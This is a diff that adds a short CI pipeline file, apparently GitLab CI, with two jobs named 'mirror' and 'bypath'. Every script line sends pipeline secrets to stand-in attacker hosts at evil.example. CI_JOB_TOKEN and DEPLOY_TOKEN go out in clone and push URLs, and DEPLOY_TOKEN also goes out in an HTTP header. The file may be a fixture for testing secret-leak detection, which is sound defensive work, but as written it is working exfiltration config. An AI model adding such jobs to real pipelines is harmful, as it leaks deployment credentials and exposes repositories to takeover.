@@ -1,0 +1,9 @@
+mirror:
+  image: alpine:3.19
+  script:
+    - git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@evil.example/x.git
+    - 'git -c http.extraheader="PRIVATE-TOKEN: $DEPLOY_TOKEN" clone https://mirror.evil.example/x.git'
+bypath:
+  image: alpine:3.19
+  script:
+    - /usr/bin/git push https://x:$DEPLOY_TOKEN@path.evil.example/r HEAD
